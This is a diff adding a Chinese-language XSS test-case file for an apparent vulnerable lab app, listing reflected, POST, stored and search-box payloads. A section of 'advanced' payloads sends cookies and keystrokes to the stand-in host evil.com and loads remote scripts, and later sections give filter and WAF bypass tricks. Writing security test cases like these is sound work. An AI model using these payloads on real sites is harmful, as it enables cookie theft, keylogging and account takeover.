@@ -1,0 +1,158 @@
+# XSS (跨站脚本攻击) 漏洞测试用例
+
+# ============================================
+# 1. 反射型 XSS - GET
+# ============================================
+# 端点: /xss/reflect?vuln={payload}
+
+# 基础 Script 标签
+vuln=<script>alert(1)</script>
+
+# Script 标签 - 事件
+vuln=<script>alert(document.cookie)</script>
+vuln=<script>alert(document.domain)</script>
+vuln=<script>prompt(1)</script>
+vuln=<script>confirm(1)</script>
+
+# Img 标签 - onerror 事件
+vuln=<img src=x onerror=alert(1)>
+vuln=<img src=x onerror=alert(document.cookie)>
+
+# SVG 标签
+vuln=<svg onload=alert(1)>
+
+# Body 标签 - onload
+vuln=<body onload=alert(1)>
+
+# Iframe 标签
+vuln=<iframe onload=alert(1)>
+
+# Input 标签 - autofocus
+vuln=<input autofocus onfocus=alert(1)>
+
+# Details 标签
+vuln=<details open ontoggle=alert(1)>
+
+# Marquee 标签
+vuln=<marquee onstart=alert(1)>
+
+
+# ============================================
+# 2. 反射型 XSS - POST
+# ============================================
+# 端点: /xss/reflect/post (POST)
+# Content-Type: application/x-www-form-urlencoded
+
+content=<script>alert(1)</script>
+content=<img src=x onerror=alert(1)>
+
+
+# ============================================
+# 3. 存储型 XSS
+# ============================================
+# 端点: /xss/stored/store?data={payload}
+
+# 存储恶意脚本
+data=<script>alert(document.cookie)</script>
+
+# 存储后读取
+# 访问: /xss/stored/show
+
+
+# ============================================
+# 4. 搜索框 XSS
+# ============================================
+# 端点: /xss/search?q={payload}
+
+# Img onerror 注入
+q=<img src=x onerror=alert(1)>
+
+# Script 标签
+q=<script>alert(1)</script>
+
+# SVG onload
+q=<svg onload=alert(1)>
+
+
+# ============================================
+# 5. XSS 高级 Payload
+# ============================================
+
+# DOM XSS
+# <script>document.location='http://evil.com?c='+document.cookie</script>
+
+# 钓鱼攻击
+# <script>window.location='http://evil.com/phishing.html'</script>
+
+# 键盘记录
+# <script>document.onkeypress=function(e){fetch('http://evil.com/log?k='+e.key)}</script>
+
+# XSS Proxy
+# <script src=http://evil.com/xss.js></script>
+
+# 数据外带
+# <script>new Image().src='http://evil.com/steal?c='+document.cookie</script>
+
+
+# ============================================
+# 6. XSS 绕过技巧
+# ============================================
+
+# 大小写绕过
+# <ScRiPt>alert(1)</ScRiPt>
+# <IMG SRC=x OnError=alert(1)>
+
+# 双写绕过
+# <scr<script>ipt>alert(1)</scr</script>ipt>
+
+# HTML 实体编码
+# &lt;script&gt;alert(1)&lt;/script&gt;
+
+# Unicode 编码
+# \u003Cscript\u003Ealert(1)\u003C/script\u003E
+
+# 十六进制编码
+# %3Cscript%3Ealert(1)%3C/script%3E
+
+# 注入到属性中
+# " onmouseover="alert(1)
+# " onfocus="alert(1)" autofocus="
+# javascript:alert(1)
+
+# CSS 注入
+# <style onload=alert(1)>
+# <div style="background:url('javascript:alert(1)')">
+
+
+# ============================================
+# 7. XSS WAF 绕过
+# ============================================
+
+# 空格绕过
+# <img/src=x onerror=alert(1)>
+
+# 换行绕过
+# <img\nsrc=x\nonerror=alert(1)>
+
+# Tab 绕过
+# <img	src=x	onerror=alert(1)>
+
+# 注释混淆
+# <img src=x onerror=a/**/lert(1)>
+
+# 特殊字符
+# <img src=x onerror=%0aalert(1)>
+
+# 编码混淆
+# <img src=x onerror=\x61\x6c\x65\x72\x74(1)>
+
+
+# ============================================
+# 验证方法
+# ============================================
+# 成功的 XSS 特征:
+# 1. 响应中原样包含 `<script>alert(1)</script>`
+# 2. 响应中包含 `<img src=x onerror=alert(1)>`
+# 3. 存储型 XSS 在读取时触发
+# 4. 浏览器执行 alert 弹窗
+# 5. Cookie 被窃取 (通过网络请求验证)
